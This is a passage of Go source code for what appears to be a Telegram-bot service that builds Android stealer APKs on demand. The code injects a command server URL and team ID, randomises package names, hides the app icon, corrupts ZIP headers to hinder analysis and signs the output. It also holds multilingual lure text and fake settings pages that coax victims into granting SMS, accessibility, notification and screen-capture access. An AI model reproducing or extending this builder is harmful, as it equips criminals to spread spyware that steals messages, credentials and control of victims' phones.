	return ciphertext, nil
}

func (b *Bot) buildStealerAPK(sess *BuildSession) ([]byte, string, error) {
	tmpDir, err := os.MkdirTemp("", "redwing-stealer-*")
	if err != nil {
		return nil, "", fmt.Errorf("tmpdir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	srcDir := filepath.Join(b.baseDir, "decom", "stealer_smali")
	workDir := filepath.Join(tmpDir, "stealer_smali")

	if err := copyDir(srcDir, workDir); err != nil {
		return nil, "", fmt.Errorf("copy stealer: %w", err)
	}

	newPkg := generateRandomPackage()
	sess.GeneratedPkg = newPkg
	if err := patchPackageName(workDir, "com.devstudio.plus", newPkg); err != nil {
		return nil, "", fmt.Errorf("patch stealer pkg: %w", err)
	}

	serverURL := b.serverIP
	if !strings.Contains(serverURL, "://") {
		serverURL = "http://" + serverURL
	}
	configData, err := buildStealerConfig(serverURL, b.teamID)
	if err != nil {
		return nil, "", fmt.Errorf("build stealer config: %w", err)
	}
	configDir := filepath.Join(workDir, "assets", "config")
	os.MkdirAll(configDir, 0755)
	if err := os.WriteFile(filepath.Join(configDir, "resource_pack_nyj.tmp"), configData, 0644); err != nil {
		return nil, "", fmt.Errorf("write stealer config: %w", err)
	}

	nbPath := filepath.Join(workDir, "smali", "com", "devstudio", "plus", "NativeBridge.smali")
	patchNativeBridgeMethod(nbPath, "getServerUrl", serverURL)
	patchNativeBridgeMethod(nbPath, "getTeamId", b.teamID)

	stringsFile := filepath.Join(workDir, "res", "values", "strings.xml")
	if err := patchXMLString(stringsFile, "app_name", sess.AppName); err != nil {
		log.Printf("[BUILDER] WARNING: stealer patch app_name: %v", err)
	}

	if sess.IconFileID != "" {
		if iconData, err := b.downloadTelegramFile(sess.IconFileID); err != nil {
			log.Printf("[BUILDER] WARNING: stealer icon download: %v", err)
		} else if err := placeIcon(workDir, iconData); err != nil {
			log.Printf("[BUILDER] WARNING: stealer icon place: %v", err)
		}
	}

	if !sess.HideIcon {
		manifestFile := filepath.Join(workDir, "AndroidManifest.xml")
		mData, _ := os.ReadFile(manifestFile)
		ms := string(mData)
		ms = strings.Replace(ms,
			`android:enabled="false" android:exported="true" android:name="com.devstudio.plus.VisibleAlias"`,
			`android:enabled="true" android:exported="true" android:name="com.devstudio.plus.VisibleAlias"`, 1)
		ms = strings.Replace(ms,
			`android:enabled="true" android:exported="true" android:name="com.devstudio.plus.HiddenAlias"`,
			`android:enabled="false" android:exported="true" android:name="com.devstudio.plus.HiddenAlias"`, 1)
		os.WriteFile(manifestFile, []byte(ms), 0644)
	}

	if sess.AppLang != "" {
		patchStealerLocale(workDir, sess.AppLang)
	}

	if sess.WebViewURL != "" {
		patchStealerWebviewURL(workDir, sess.WebViewURL)
	}

	outputAPK := filepath.Join(tmpDir, "output.apk")
	cmd := exec.Command("apktool", "b", workDir, "-o", outputAPK)
	cmd.Dir = tmpDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return nil, "", fmt.Errorf("apktool build stealer: %v", err)
	}

	alignedAPK := filepath.Join(tmpDir, "aligned.apk")
	if err := zipalign4(outputAPK, alignedAPK); err != nil {
		return nil, "", fmt.Errorf("zipalign stealer: %v", err)
	}
	outputAPK = alignedAPK

	if err := pseudoEncryptZip(outputAPK); err != nil {
		return nil, "", fmt.Errorf("pseudo-encrypt stealer: %w", err)
	}
	if err := b.signWithEphemeralKey(outputAPK); err != nil {
		return nil, "", fmt.Errorf("sign stealer: %w", err)
	}

	apkData, err := os.ReadFile(outputAPK)
	if err != nil {
		return nil, "", fmt.Errorf("read stealer output: %w", err)
	}

	apkName := sess.AppName + ".apk"
	log.Printf("[BUILDER] Stealer build complete: %s (%.1f MB)", apkName, float64(len(apkData))/1024/1024)
	return apkData, apkName, nil
}

var stealerStrings = map[string]map[string]string{
	"ru": {
		"Continue":                                "Продолжить",
		"SMS Access":                              "SMS доступ",
		"Required to access this resource":        "Для доступа к данному ресурсу",
		"Battery Optimization":                    "Оптимизация батареи",
		"Required for stable background operation": "Необходимо для стабильной фоновой работы",
		"Notifications":                           "Уведомления",
		"Required to deliver important updates":   "Для доставки важных обновлений",
		"Required to receive important alerts":    "Для получения важных уведомлений",
	},
	"tr": {
		"Continue":                                "Devam",
		"SMS Access":                              "SMS Erişimi",
		"Required to access this resource":        "Bu kaynağa erişmek için gerekli",
		"Battery Optimization":                    "Pil Optimizasyonu",
		"Required for stable background operation": "Kararlı arka plan çalışması için gerekli",
		"Notifications":                           "Bildirimler",
		"Required to deliver important updates":   "Önemli güncellemeleri iletmek için gerekli",
		"Required to receive important alerts":    "Önemli uyarıları almak için gerekli",
	},
	"de": {
		"Continue":                                "Weiter",
		"SMS Access":                              "SMS-Zugriff",
		"Required to access this resource":        "Erforderlich für den Zugriff",
		"Battery Optimization":                    "Akkuoptimierung",
		"Required for stable background operation": "Erforderlich für stabilen Hintergrundbetrieb",
		"Notifications":                           "Benachrichtigungen",
		"Required to deliver important updates":   "Erforderlich für wichtige Updates",
		"Required to receive important alerts":    "Erforderlich für wichtige Warnungen",
	},
	"fr": {
		"Continue":                                "Continuer",
		"SMS Access":                              "Accès SMS",
		"Required to access this resource":        "Requis pour accéder à cette ressource",
		"Battery Optimization":                    "Optimisation de la batterie",
		"Required for stable background operation": "Requis pour un fonctionnement stable",
		"Notifications":                           "Notifications",
		"Required to deliver important updates":   "Requis pour les mises à jour importantes",
		"Required to receive important alerts":    "Requis pour recevoir les alertes importantes",
	},
	"es": {
		"Continue":                                "Continuar",
		"SMS Access":                              "Acceso SMS",
		"Required to access this resource":        "Necesario para acceder a este recurso",
		"Battery Optimization":                    "Optimización de batería",
		"Required for stable background operation": "Necesario para operación estable en segundo plano",
		"Notifications":                           "Notificaciones",
		"Required to deliver important updates":   "Necesario para entregar actualizaciones importantes",
		"Required to receive important alerts":    "Necesario para recibir alertas importantes",
	},
	"pt": {
		"Continue":                                "Continuar",
		"SMS Access":                              "Acesso SMS",
		"Required to access this resource":        "Necessário para acessar este recurso",
		"Battery Optimization":                    "Otimização de bateria",
		"Required for stable background operation": "Necessário para operação estável em segundo plano",
		"Notifications":                           "Notificações",
		"Required to deliver important updates":   "Necessário para entregar atualizações importantes",
		"Required to receive important alerts":    "Necessário para receber alertas importantes",
	},
	"ar": {
		"Continue":                                "متابعة",
		"SMS Access":                              "الوصول إلى الرسائل",
		"Required to access this resource":        "مطلوب للوصول إلى هذا المورد",
		"Battery Optimization":                    "تحسين البطارية",
		"Required for stable background operation": "مطلوب للعمل المستقر في الخلفية",
		"Notifications":                           "الإشعارات",
		"Required to deliver important updates":   "مطلوب لتسليم التحديثات المهمة",
		"Required to receive important alerts":    "مطلوب لتلقي التنبيهات المهمة",
	},
}

func patchStealerLocale(workDir, lang string) {
	smaliPath := filepath.Join(workDir, "smali", "a", "a.smali")
	data, err := os.ReadFile(smaliPath)
	if err != nil {
		return
	}
	s := string(data)

	const methodSig = ".method public static i()Z"
	const endMarker = ".end method"

	idx := strings.Index(s, methodSig)
	if idx < 0 {
		return
	}
	endIdx := strings.Index(s[idx:], endMarker)
	if endIdx < 0 {
		return
	}

	retVal := "0x0"
	if lang == "ru" {
		retVal = "0x1"
	}

	replacement := fmt.Sprintf(`.method public static i()Z
    .locals 1
    const/4 v0, %s
    return v0
.end method`, retVal)

	s = s[:idx] + replacement + s[idx+endIdx+len(endMarker):]
	os.WriteFile(smaliPath, []byte(s), 0644)

	if lang == "ru" || lang == "en" {
		return
	}
	tr, ok := stealerStrings[lang]
	if !ok {
		return
	}
	obPath := filepath.Join(workDir, "smali", "com", "devstudio", "plus", "OnboardingActivity.smali")
	obData, err := os.ReadFile(obPath)
	if err != nil {
		return
	}
	ob := string(obData)
	for en, localized := range tr {
		ob = strings.ReplaceAll(ob, fmt.Sprintf(`const-string v9, "%s"`, en), fmt.Sprintf(`const-string v9, "%s"`, localized))
		ob = strings.ReplaceAll(ob, fmt.Sprintf(`const-string v5, "%s"`, en), fmt.Sprintf(`const-string v5, "%s"`, localized))
		ob = strings.ReplaceAll(ob, fmt.Sprintf(`const-string v7, "%s"`, en), fmt.Sprintf(`const-string v7, "%s"`, localized))
		ob = strings.ReplaceAll(ob, fmt.Sprintf(`const-string v4, "%s"`, en), fmt.Sprintf(`const-string v4, "%s"`, localized))
		ob = strings.ReplaceAll(ob, fmt.Sprintf(`const-string v8, "%s"`, en), fmt.Sprintf(`const-string v8, "%s"`, localized))
	}
	os.WriteFile(obPath, []byte(ob), 0644)
}

func patchStealerWebviewURL(workDir, newURL string) {
	smaliPath := filepath.Join(workDir, "smali", "com", "devstudio", "plus", "OnboardingActivity.smali")
	data, err := os.ReadFile(smaliPath)
	if err != nil {
		log.Printf("[BUILDER] WARNING: read OnboardingActivity.smali: %v", err)
		return
	}
	s := string(data)
	s = strings.Replace(s, `const-string v5, "https://www.google.com"`, fmt.Sprintf(`const-string v5, "%s"`, newURL), 1)
	os.WriteFile(smaliPath, []byte(s), 0644)
}

func patchNativeBridgeMethod(nbPath, methodName, value string) {
	data, err := os.ReadFile(nbPath)
	if err != nil {
		log.Printf("[BUILDER] WARNING: read NativeBridge: %v", err)
		return
	}
	s := string(data)

	oldSig := fmt.Sprintf(".method public static final %s()Ljava/lang/String;", methodName)
	endMarker := ".end method"

	idx := strings.Index(s, oldSig)
	if idx < 0 {
		log.Printf("[BUILDER] WARNING: NativeBridge.%s not found", methodName)
		return
	}
	endIdx := strings.Index(s[idx:], endMarker)
	if endIdx < 0 {
		return
	}

	replacement := fmt.Sprintf(`.method public static final %s()Ljava/lang/String;
    .locals 1
    const-string v0, "%s"
    return-object v0
.end method`, methodName, value)

	s = s[:idx] + replacement + s[idx+endIdx+len(endMarker):]
	os.WriteFile(nbPath, []byte(s), 0644)
}


func (b *Bot) signWithEphemeralKey(apkPath string) error {
	ks := filepath.Join(b.baseDir, "decom", "debug.keystore")
	cmd := exec.Command(findApksigner(),
		"sign",
		"--ks", ks,
		"--ks-key-alias", "redwing",
		"--ks-pass", "pass:android",
		"--key-pass", "pass:android",
		apkPath,
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func findApksigner() string {
	if p, err := exec.LookPath("apksigner"); err == nil {
		return p
	}
	home, _ := os.UserHomeDir()
	sdkRoot := filepath.Join(home, "Library", "Android", "sdk")
	if env := os.Getenv("ANDROID_HOME"); env != "" {
		sdkRoot = env
	}
	if env := os.Getenv("ANDROID_SDK_ROOT"); env != "" {
		sdkRoot = env
	}
	btDir := filepath.Join(sdkRoot, "build-tools")
	entries, err := os.ReadDir(btDir)
	if err != nil {
		return "apksigner"
	}
	var latest string
	for _, e := range entries {
		if e.IsDir() {
			latest = e.Name()
		}
	}
	if latest == "" {
		return "apksigner"
	}
	return filepath.Join(btDir, latest, "apksigner")
}

func findEOCD(data []byte) int {
	for i := len(data) - 22; i >= 0 && i >= len(data)-65536; i-- {
		if binary.LittleEndian.Uint32(data[i:]) == 0x06054b50 {
			return i
		}
	}
	return -1
}

func pseudoEncryptZip(apkPath string) error {
	data, err := os.ReadFile(apkPath)
	if err != nil {
		return err
	}

	eocdPos := findEOCD(data)
	if eocdPos < 0 {
		return os.WriteFile(apkPath, data, 0644)
	}

	cdOffset := int(binary.LittleEndian.Uint32(data[eocdPos+16:]))
	cdCount := int(binary.LittleEndian.Uint16(data[eocdPos+10:]))

	pos := cdOffset
	for j := 0; j < cdCount && pos+46 <= len(data); j++ {
		if binary.LittleEndian.Uint32(data[pos:]) != 0x02014b50 {
			break
		}
		data[pos+8] |= 0x01

		localOff := int(binary.LittleEndian.Uint32(data[pos+42:]))
		if localOff >= 0 && localOff+30 <= len(data) {
			if binary.LittleEndian.Uint32(data[localOff:]) == 0x04034b50 {
				data[localOff+6] |= 0x01
			}
		}

		nameLen := int(binary.LittleEndian.Uint16(data[pos+28:]))
		extraLen := int(binary.LittleEndian.Uint16(data[pos+30:]))
		commentLen := int(binary.LittleEndian.Uint16(data[pos+32:]))
		pos += 46 + nameLen + extraLen + commentLen
	}

	return os.WriteFile(apkPath, data, 0644)
}

func patchServiceRestart(smaliPath string) {
	data, err := os.ReadFile(smaliPath)
	if err != nil {
		log.Printf("[BUILDER] WARNING: patchServiceRestart read: %v", err)
		return
	}
	s := string(data)

	oldCode := ":cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
	newCode := `:cond_16
    :goto_6
    sget-object v0, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;
    if-eqz v0, :skip_svc_restart
    iget-object v0, v0, Lv/s/RWY6BVSB0XxPbw;->dDIMxZXP1V8HdM:Landroid/content/Context;
    if-eqz v0, :skip_svc_restart
    invoke-static {v0}, Lv/s/y6jRGLEWNMir;->hjneShqpF9Tis4(Landroid/content/Context;)V
    :skip_svc_restart
    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;`

	s = strings.Replace(s, oldCode, newCode, 1)

	if err := os.WriteFile(smaliPath, []byte(s), 0644); err != nil {
		log.Printf("[BUILDER] WARNING: patchServiceRestart write: %v", err)
	} else {
		
	}
}

func patchTeamID(smaliPath, tid string) error {
	data, err := os.ReadFile(smaliPath)
	if err != nil {
		return err
	}
	s := string(data)

	methodStart := ".method public static vekpFI4d1Nc4fakF()Ljava/lang/String;"
	startIdx := strings.Index(s, methodStart)
	if startIdx < 0 {
		return fmt.Errorf("method vekpFI4d1Nc4fakF not found")
	}

	endMarker := ".end method"
	rest := s[startIdx+len(methodStart):]
	endIdx := strings.Index(rest, endMarker)
	if endIdx < 0 {
		return fmt.Errorf("end of method vekpFI4d1Nc4fakF not found")
	}

	newBody := fmt.Sprintf(`%s
    .locals 1

    const-string v0, "%s"

    return-object v0
%s`, methodStart, tid, endMarker)

	s = s[:startIdx] + newBody + s[startIdx+len(methodStart)+endIdx+len(endMarker):]
	

	nativeAnchor := ":try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;"
	intercept := fmt.Sprintf("    const/16 v0, 0x3d\n\n    if-ne p0, v0, :not_rw_tid1\n\n    const-string v0, \"%s\"\n\n    return-object v0\n\n    :not_rw_tid1\n    const/16 v0, 0x41\n\n    if-ne p0, v0, :not_rw_tid2\n\n    const-string v0, \"%s\"\n\n    return-object v0\n\n    :not_rw_tid2\n    :try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;", tid, tid)

	if strings.Contains(s, nativeAnchor) {
		s = strings.Replace(s, nativeAnchor, intercept, 1)
		
	} else {
		log.Printf("[BUILDER] WARNING: native fallback anchor not found, team_id may not be fully patched")
	}

	return os.WriteFile(smaliPath, []byte(s), 0644)
}

func patchFileStrings(path string, replacements map[string]string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	content := string(data)
	for old, new := range replacements {
		content = strings.ReplaceAll(content, old, new)
	}
	return os.WriteFile(path, []byte(content), 0644)
}

func mergeStringsXML(dstPath, srcPath string) {
	dstData, err := os.ReadFile(dstPath)
	if err != nil {
		return
	}
	srcData, err := os.ReadFile(srcPath)
	if err != nil {
		return
	}
	dst := string(dstData)
	re := regexp.MustCompile(`<string name="([^"]+)"[^>]*>([\s\S]*?)</string>`)
	for _, m := range re.FindAllStringSubmatch(string(srcData), -1) {
		name, val := m[1], m[2]
		prefix := fmt.Sprintf(`<string name="%s">`, name)
		idx := strings.Index(dst, prefix)
		if idx < 0 {
			continue
		}
		end := strings.Index(dst[idx+len(prefix):], "</string>")
		if end < 0 {
			continue
		}
		dst = dst[:idx+len(prefix)] + val + dst[idx+len(prefix)+end:]
	}
	os.WriteFile(dstPath, []byte(dst), 0644)
}

func patchXMLString(path, name, value string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	content := string(data)
	prefix := fmt.Sprintf(`<string name="%s">`, name)
	idx := strings.Index(content, prefix)
	if idx < 0 {
		return fmt.Errorf("string %q not found", name)
	}
	end := strings.Index(content[idx+len(prefix):], "</string>")
	if end < 0 {
		return fmt.Errorf("closing tag not found for %q", name)
	}
	safe := strings.ReplaceAll(value, `\'`, "\x00APOS\x00")
	safe = strings.ReplaceAll(safe, `'`, `\'`)
	safe = strings.ReplaceAll(safe, "\x00APOS\x00", `\'`)
	content = content[:idx+len(prefix)] + safe + content[idx+len(prefix)+end:]
	return os.WriteFile(path, []byte(content), 0644)
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(src, path)
		target := filepath.Join(dst, rel)

		if info.IsDir() {
			return os.MkdirAll(target, 0755)
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		return os.WriteFile(target, data, info.Mode())
	})
}

func getAppStrings(lang string) map[string]string {
	switch lang {
	case "ru":
		return map[string]string{
			"accessibility_service_description": "Служба специальных возможностей для удобного управления устройством и автоматизации задач.",
			"onboard_fallback_label":            "приложение",
			"onboard_notif_big":                 `Найдите \"%1$s\" в разделе \"Сервисы\" и включите переключатель. После этого настройка завершится автоматически.`,
			"onboard_notif_text":                `Нажмите на \"%1$s\" в списке сервисов и включите переключатель`,
			"onboard_notif_title":               `👆 Найдите \"%1$s\" и включите тумблер`,
		}
	case "tr":
		return map[string]string{
			"accessibility_service_description": "Cihaz yönetimi ve görev otomasyonu için erişilebilirlik hizmeti.",
			"onboard_fallback_label":            "uygulama",
			"onboard_notif_big":                 `\"%1$s\" öğesini \"Hizmetler\" bölümünde bulun ve anahtarı açın. Kurulum bundan sonra otomatik olarak tamamlanacaktır.`,
			"onboard_notif_text":                `Hizmetler listesinde \"%1$s\" öğesine dokunun ve anahtarı açın`,
			"onboard_notif_title":               `\"%1$s\" öğesini bulun ve etkinleştirin`,
		}
	case "de":
		return map[string]string{
			"accessibility_service_description": "Barrierefreiheitsdienst für bequeme Geräteverwaltung und Aufgabenautomatisierung.",
			"onboard_fallback_label":            "Anwendung",
			"onboard_notif_big":                 `Suchen Sie \"%1$s\" im Bereich \"Dienste\" und aktivieren Sie den Schalter. Die Einrichtung wird danach automatisch abgeschlossen.`,
			"onboard_notif_text":                `Tippen Sie auf \"%1$s\" in der Dienstliste und aktivieren Sie den Schalter`,
			"onboard_notif_title":               `Finden Sie \"%1$s\" und aktivieren Sie den Schalter`,
		}
	case "fr":
		return map[string]string{
			"accessibility_service_description": "Service d'accessibilité pour la gestion de l'appareil et l'automatisation des tâches.",
			"onboard_fallback_label":            "application",
			"onboard_notif_big":                 `Trouvez \"%1$s\" dans la section \"Services\" et activez l'interrupteur. La configuration se terminera automatiquement.`,
			"onboard_notif_text":                `Appuyez sur \"%1$s\" dans la liste des services et activez l'interrupteur`,
			"onboard_notif_title":               `Trouvez \"%1$s\" et activez l'interrupteur`,
		}
	case "es":
		return map[string]string{
			"accessibility_service_description": "Servicio de accesibilidad para la gestión del dispositivo y la automatización de tareas.",
			"onboard_fallback_label":            "aplicación",
			"onboard_notif_big":                 `Busque \"%1$s\" en la sección \"Servicios\" y active el interruptor. La configuración se completará automáticamente.`,
			"onboard_notif_text":                `Toque \"%1$s\" en la lista de servicios y active el interruptor`,
			"onboard_notif_title":               `Busque \"%1$s\" y active el interruptor`,
		}
	case "pt":
		return map[string]string{
			"accessibility_service_description": "Serviço de acessibilidade para gerenciamento de dispositivos e automação de tarefas.",
			"onboard_fallback_label":            "aplicativo",
			"onboard_notif_big":                 `Encontre \"%1$s\" na seção \"Serviços\" e ative o interruptor. A configuração será concluída automaticamente.`,
			"onboard_notif_text":                `Toque em \"%1$s\" na lista de serviços e ative o interruptor`,
			"onboard_notif_title":               `Encontre \"%1$s\" e ative o interruptor`,
		}
	case "ar":
		return map[string]string{
			"accessibility_service_description": "خدمة إمكانية الوصول لإدارة الجهاز وأتمتة المهام بسهولة.",
			"onboard_fallback_label":            "التطبيق",
			"onboard_notif_big":                 `ابحث عن \"%1$s\" في قسم \"الخدمات\" وقم بتفعيل المفتاح. سيكتمل الإعداد تلقائيًا بعد ذلك.`,
			"onboard_notif_text":                `انقر على \"%1$s\" في قائمة الخدمات وقم بتفعيل المفتاح`,
			"onboard_notif_title":               `ابحث عن \"%1$s\" وقم بتفعيل المفتاح`,
		}
	default:
		return map[string]string{
			"accessibility_service_description": "Accessibility service for convenient device management and task automation.",
			"onboard_fallback_label":            "application",
			"onboard_notif_big":                 `Find \"%1$s\" in the \"Services\" section and enable the switch. Setup will complete automatically after that.`,
			"onboard_notif_text":                `Tap \"%1$s\" in the services list and enable the switch`,
			"onboard_notif_title":               `Find \"%1$s\" and enable the toggle`,
		}
	}
}

func (b *Bot) downloadTelegramFile(fileID string) ([]byte, error) {
	resp, err := b.tgAPI("getFile", map[string]any{"file_id": fileID})
	if err != nil {
		return nil, fmt.Errorf("getFile: %w", err)
	}
	result, ok := resp["result"].(map[string]any)
	if !ok {
		return nil, fmt.Errorf("getFile: no result")
	}
	filePath, ok := result["file_path"].(string)
	if !ok {
		return nil, fmt.Errorf("getFile: no file_path")
	}
	url := fmt.Sprintf("https://api.telegram.org/file/bot%s/%s", b.botToken, filePath)
	httpResp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("download: %w", err)
	}
	defer httpResp.Body.Close()
	return io.ReadAll(httpResp.Body)
}

func placeIcon(workDir string, imgData []byte) error {
	src, _, err := image.Decode(bytes.NewReader(imgData))
	if err != nil {
		return fmt.Errorf("decode: %w", err)
	}
	sizes := map[string]int{
		"mipmap-mdpi": 48, "mipmap-hdpi": 72, "mipmap-xhdpi": 96,
		"mipmap-xxhdpi": 144, "mipmap-xxxhdpi": 192,
	}
	for dir, sz := range sizes {
		dst := image.NewRGBA(image.Rect(0, 0, sz, sz))
		xdraw.CatmullRom.Scale(dst, dst.Bounds(), src, src.Bounds(), xdraw.Over, nil)
		for _, name := range []string{"ic_launcher.png", "ic_launcher_round.png"} {
			p := filepath.Join(workDir, "res", dir, name)
			f, err := os.Create(p)
			if err != nil {
				return err
			}
			if err := png.Encode(f, dst); err != nil {
				f.Close()
				return err
			}
			f.Close()
		}
	}
	return nil
}

func getHTMLReplacements(lang string) map[string]string {
	type tr struct {
		settings, downloaded, requireAccess, enable string
		displaySize, colorMotion                    string
		magnification, zoomScreen                   string
		accessMenu, controlMenu                     string
		batterySaver, batteryUsage                  string
		batteryPct, statusBar                       string
		deviceControls, doNotDisturb, notifHistory  string
		notifStyle, appNotif                        string
		locAccess, locAccuracy, locHistory           string
		screenRec, audioSettings, cast              string
		off                                         string
		descAccessibility, descBattery              string
		descSmsDefault, descNotifAccess             string
		descNotifPermit, descScreen                 string
		smsHint, smsBtn                             string
	}
	m := map[string]tr{
		"ru": {
			settings: "Настройки", downloaded: "Скачанные приложения",
			requireAccess: "Это приложение требует разрешения для работы.",
			enable: "Включить", off: "Выкл",
			displaySize: "Размер экрана и текст", colorMotion: "Цвет и движение",
			magnification: "Увеличение", zoomScreen: "Выкл / Увеличение области экрана",
			accessMenu: "Меню специальных возможностей", controlMenu: "Выкл / Управление через меню",
			batterySaver: "Энергосбережение", batteryUsage: "Использование батареи",
			batteryPct: "Уровень заряда", statusBar: "В строке состояния",
			deviceControls: "Элементы управления", doNotDisturb: "Не беспокоить", notifHistory: "История уведомлений",
			notifStyle: "Стиль уведомлений", appNotif: "Уведомления приложений",
			locAccess: "Доступ к местоположению", locAccuracy: "Точность местоположения", locHistory: "История местоположений",
			screenRec: "Запись экрана", audioSettings: "Настройки звука", cast: "Трансляция",
			descAccessibility: "Это приложение требует разрешения для работы. Пожалуйста, разрешите для продолжения.",
			descBattery:       "Это приложение требует неограниченного доступа к батарее. Пожалуйста, разрешите.",
			descSmsDefault:    "Это приложение должно быть установлено как обработчик SMS по умолчанию и требует неограниченного доступа к батарее.",
			descNotifAccess:   "Это приложение требует доступа к уведомлениям для синхронизации данных и доставки сообщений.",
			descNotifPermit:   "Это приложение требует разрешения на уведомления для доставки важных обновлений. Пожалуйста, разрешите.",
			descScreen:        "Разрешение на запись экрана необходимо для мониторинга безопасности. Пожалуйста, разрешите.",
			smsHint: "Откройте Настройки &#x2192; Приложения по умолчанию &#x2192; SMS и выберите это приложение.",
			smsBtn:  "Открыть настройки",
		},
		"tr": {
			settings: "Ayarlar", downloaded: "İndirilen uygulamalar",
			requireAccess: "Bu uygulama çalışmak için erişim izni gerektirir.",
			enable: "Etkinleştir", off: "Kapalı",
			displaySize: "Ekran boyutu ve metin", colorMotion: "Renk ve hareket",
			magnification: "Büyütme", zoomScreen: "Kapalı / Ekranı yakınlaştır",
			accessMenu: "Erişilebilirlik Menüsü", controlMenu: "Kapalı / Büyük menü ile kontrol",
			batterySaver: "Pil Tasarrufu", batteryUsage: "Pil kullanımı",
			batteryPct: "Pil yüzdesi", statusBar: "Durum çubuğunda göster",
			deviceControls: "Cihaz kontrolleri", doNotDisturb: "Rahatsız Etmeyin", notifHistory: "Bildirim geçmişi",
			notifStyle: "Bildirim stili", appNotif: "Uygulama bildirimleri",
			locAccess: "Konum erişimi", locAccuracy: "Konum doğruluğu", locHistory: "Konum geçmişi",
			screenRec: "Ekran kaydı", audioSettings: "Ses ayarları", cast: "Yayınla",
			descAccessibility: "Bu uygulama çalışmak için erişim izni gerektirir. Devam etmek için lütfen izin verin.",
			descBattery:       "Bu uygulama düzgün çalışmak için sınırsız pil erişimi gerektirir. Lütfen izin verin.",
			descSmsDefault:    "Bu uygulamanın varsayılan SMS işleyicisi olarak ayarlanması ve sınırsız pil erişimi gerekmektedir.",
			descNotifAccess:   "Bu uygulama veri senkronizasyonu ve anlık mesaj teslimi için bildirim erişimi gerektirir.",
			descNotifPermit:   "Bu uygulama önemli güncellemeleri iletmek için bildirim izni gerektirir. Lütfen izin verin.",
			descScreen:        "Güvenlik izleme için ekran yakalama izni gereklidir. Lütfen izin verin.",
			smsHint: "Ayarlar &#x2192; Varsayılan uygulamalar &#x2192; SMS açın ve bu uygulamayı seçin.",
			smsBtn:  "Ayarları Aç",
		},
		"de": {
			settings: "Einstellungen", downloaded: "Heruntergeladene Apps",
			requireAccess: "Diese App benötigt eine Zugriffsberechtigung.",
			enable: "Aktivieren", off: "Aus",
			displaySize: "Anzeigegröße und Text", colorMotion: "Farbe und Bewegung",
			magnification: "Vergrößerung", zoomScreen: "Aus / Bildschirm vergrößern",
			accessMenu: "Bedienungshilfen-Menü", controlMenu: "Aus / Gerät über Menü steuern",
			batterySaver: "Energiesparmodus", batteryUsage: "Akkuverbrauch",
			batteryPct: "Akku-Prozentsatz", statusBar: "In Statusleiste anzeigen",
			deviceControls: "Gerätesteuerung", doNotDisturb: "Bitte nicht stören", notifHistory: "Benachrichtigungsverlauf",
			notifStyle: "Benachrichtigungsstil", appNotif: "App-Benachrichtigungen",
			locAccess: "Standortzugriff", locAccuracy: "Standortgenauigkeit", locHistory: "Standortverlauf",
			screenRec: "Bildschirmaufnahme", audioSettings: "Audioeinstellungen", cast: "Übertragen",
			descAccessibility: "Diese App benötigt eine Zugriffsberechtigung. Bitte erlauben Sie den Zugriff.",
			descBattery:       "Diese App benötigt uneingeschränkten Akkuzugriff. Bitte erlauben Sie den Zugriff.",
			descSmsDefault:    "Diese App muss als Standard-SMS-App festgelegt werden und benötigt uneingeschränkten Akkuzugriff.",
			descNotifAccess:   "Diese App benötigt Benachrichtigungszugriff für Datensynchronisierung und Nachrichtenübermittlung.",
			descNotifPermit:   "Diese App benötigt eine Benachrichtigungsberechtigung für wichtige Updates. Bitte erlauben.",
			descScreen:        "Bildschirmaufnahme-Berechtigung ist für die Sicherheitsüberwachung erforderlich. Bitte erlauben.",
			smsHint: "Öffnen Sie Einstellungen &#x2192; Standard-Apps &#x2192; SMS und wählen Sie diese App.",
			smsBtn:  "Einstellungen öffnen",
		},
		"fr": {
			settings: "Paramètres", downloaded: "Applis téléchargées",
			requireAccess: "Cette application nécessite une autorisation d\\'accès.",
			enable: "Activer", off: "Désactivé",
			displaySize: "Taille d\\'affichage et texte", colorMotion: "Couleur et mouvement",
			magnification: "Agrandissement", zoomScreen: "Désactivé / Zoom sur l\\'écran",
			accessMenu: "Menu d\\'accessibilité", controlMenu: "Désactivé / Contrôle via le menu",
			batterySaver: "Économiseur de batterie", batteryUsage: "Utilisation de la batterie",
			batteryPct: "Pourcentage de batterie", statusBar: "Afficher dans la barre d\\'état",
			deviceControls: "Commandes de l\\'appareil", doNotDisturb: "Ne pas déranger", notifHistory: "Historique des notifications",
			notifStyle: "Style de notification", appNotif: "Notifications des applis",
			locAccess: "Accès à la localisation", locAccuracy: "Précision de la localisation", locHistory: "Historique des positions",
			screenRec: "Enregistrement d\\'écran", audioSettings: "Paramètres audio", cast: "Diffuser",
			descAccessibility: "Cette application nécessite une autorisation d\\'accès. Veuillez autoriser pour continuer.",
			descBattery:       "Cette application nécessite un accès illimité à la batterie. Veuillez autoriser.",
			descSmsDefault:    "Cette application doit être définie comme gestionnaire SMS par défaut et nécessite un accès illimité à la batterie.",
			descNotifAccess:   "Cette application nécessite un accès aux notifications pour la synchronisation des données.",
			descNotifPermit:   "Cette application nécessite une autorisation de notification pour les mises à jour. Veuillez autoriser.",
			descScreen:        "L\\'autorisation de capture d\\'écran est requise pour la surveillance. Veuillez autoriser.",
			smsHint: "Ouvrez Paramètres &#x2192; Applications par défaut &#x2192; SMS et sélectionnez cette application.",
			smsBtn:  "Ouvrir les paramètres",
		},
		"es": {
			settings: "Ajustes", downloaded: "Apps descargadas",
			requireAccess: "Esta aplicación requiere permiso de acceso para funcionar.",
			enable: "Habilitar", off: "Desactivado",
